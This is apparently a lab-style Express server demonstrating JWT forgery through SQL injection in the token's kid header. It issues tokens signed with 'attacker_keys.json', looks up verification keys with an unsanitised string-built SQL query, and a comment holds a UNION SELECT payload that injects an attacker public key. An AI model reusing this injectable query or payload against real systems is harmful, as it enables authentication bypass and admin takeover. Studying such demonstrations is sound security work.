const Express = require('express');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const jose = require('node-jose');
const jwktopem = require('jwk-to-pem')
const axios = require('axios')
const app = new Express();
var sqlite3 = require('sqlite3').verbose();
app.use(Express.json())
let db1 = new sqlite3.Database('vuln_api.db');


// define the payload


app.get('/jwks', async (req, res) => {
    const ks = fs.readFileSync('attacker_keys.json')
    const keyStore = await jose.JWK.asKeyStore(ks.toString())
    
    res.send(keyStore.toJSON())
  })
  app.get('/tokens', async (req, res) => {
    const ks = fs.readFileSync('attacker_keys.json')
    const keyStore = await jose.JWK.asKeyStore(ks.toString())
    const [key] = keyStore.all({ use: 'sig' })
    
    const opt = { compact: true, jwk: key, fields: { typ: 'jwt', kid: "3" } }
    const payload = JSON.stringify({
      exp: Math.floor((Date.now() + 24*60*60*1000) / 1000),
      iat: Math.floor(Date.now() / 1000),
      sub: 'test',

    })
    let token = await jose.JWS.createSign(opt, key)
      .update(payload)
      .final()
    token = token.toString('base64')
    res.send({ token})
  })
  app.get('/verify', validateToken, async (req, res) => {
    res.send("atak jako localhost:5002 / admin udany")
  })
  app.get('/admin', validateToken, async (req, res) => {
    const authHeader = req.headers["authorization"]
    const token = authHeader.split(" ")[1]
    var decoded = JSON.parse(jwt.decode(token));
    if(decoded.user== 'admin'){
      res.send("admin accessed")
    }
    else{
      res.status(403).send("not admin")
    }

    console.log(decoded)
  })
  //`0 UNION SELECT \'-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDOZ2ZxoEmy0oSkE+XF1Nau+7OM\nw1uHQiasyx6Tvp+SEVjRf+gcIuUdfbVIni1QcrM6jnqBM/HokCH+3/prTc1yKi31\nU41a7bRreb20qYDN7cvGf4UdQsoNbIgfC65OcTPAxHMdGcOTiLRqi4HjpyEPfbv7\nJ0j2DeRQPMOUk6xLDwIDAQAB\n-----END PUBLIC KEY-----\'`
  
  async function validateToken(req, res, next) {
    const authHeader = req.headers["authorization"]
    const token = authHeader.split(" ")[1]
    var decoded = jwt.decode(token);
    const header = JSON.parse(Buffer.from(token.split('.')[0], 'base64').toString())
    let kid = header.kid
    const pem = await getPemById(db1, kid);
      if (token == null) res.sendStatus(400).send("Token not present")
     let publicKey = pem
     console.log(publicKey)
     jwt.verify(token, publicKey, (err, user) => {
      if (err) {
        console.log(err)
          res.status(403).send("Token invalid")
      }
      else {
          req.user = user
          next() //proceed to the next action in the calling function
      }
  })
}

async function getPemById(db, kid) {
  return new Promise((resolve, reject) => {
      db.get(`SELECT pem FROM keys where id = ${kid}`,(err, row) => {
          if (err) reject(err); 
          resolve(row.pem);
      });
  });
}

  app.listen(5001, () => console.log('server started :5001'))